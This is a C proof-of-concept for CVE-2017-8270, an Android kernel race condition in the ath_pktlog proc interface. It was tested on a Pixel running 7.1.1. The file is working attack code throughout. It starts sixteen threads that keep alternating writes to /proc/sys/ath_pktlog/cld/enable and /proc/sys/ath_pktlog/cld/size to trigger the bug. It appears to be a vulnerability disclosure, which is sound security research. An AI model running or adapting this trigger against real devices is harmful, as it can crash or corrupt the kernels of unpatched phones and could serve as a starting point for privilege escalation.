/*
 * https://code.google.com/p/android/issues/detail?id=234443
 *
 * The poc was tested in pixel, 
 * google/sailfish/sailfish:7.1.1/NOF26V/3636322:user/release-keys
 * CVE-2017-8270
 * https://source.android.com/security/bulletin/2017-07-01
 *
 * chengjia4574@gmail.com, 201702017
*/
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/ioctl.h>
#include <pthread.h>

#define DEBUG                                               
#ifdef DEBUG                                             
#define LOG(fmt, ...) do { \
	printf("%s:%d: "fmt "\n", __FUNCTION__, \
			__LINE__, ##__VA_ARGS__); \
} while (0) 
#else
#define LOG(fmt, ...) 
#endif


int open_file(char* filename)
{
	int fd;

	fd = open(filename, O_RDWR);
	if(fd<0) {
		LOG("open %s fail %s\n",filename, strerror(errno));
		exit(1);
	}
	LOG("[%d] open %s succ return fd %d\n",gettid(),filename, fd);
	
	return fd;
}

int test_write(int fd, char* buf, int size)
{
	int ret;

	ret = write(fd, buf, size);
	if(fd<0) {
		LOG("write %d fail %s\n",fd, strerror(errno));
	} else 
		LOG("[%d] write %s succ\n",gettid(),buf);

	return ret;
}

void Thread2(void) {
	int size_fd;
	char* size1 = "1024";
	char* size2 = "2048";
	int index = 0;
	char buf[8] = {0};
	size_fd = open_file("/proc/sys/ath_pktlog/cld/size"); 
	while(1) { 
		if(index++%2)
			test_write(size_fd, size1, strlen(size1)); 
		else
			test_write(size_fd, size2, strlen(size2)); 
		sleep(1);
	}
	close(size_fd);
}

void Thread1(void) {
	int enable_fd;
	char* str1 = "0";
	char* str2 = "1";
	int index = 0;
	enable_fd = open_file("/proc/sys/ath_pktlog/cld/enable"); 
	while(1) { 
		if(index++%2)
			test_write(enable_fd, str1, strlen(str1)); 
		else
			test_write(enable_fd, str2, strlen(str2)); 
		sleep(1);
	}
	close(enable_fd);
}


#define TC 8
void trigger()
{
	int i, ret;
	pthread_t tid1s[TC];
	pthread_t tid2s[TC];
	
	LOG("Try to trigger..\n");

	for(i=0; i<TC; i++) {
		ret = pthread_create((pthread_t *) &tid1s[i], NULL, (void *) Thread1, NULL);
		ret = pthread_create((pthread_t *) &tid2s[i], NULL, (void *) Thread2, NULL);
	}

	for(i=0; i<TC; i++) {
		pthread_join(tid1s[i], NULL);
		pthread_join(tid2s[i], NULL);
	}
}

	int
main(int argc, char *argv[])
{
	trigger();
	return 0;
}
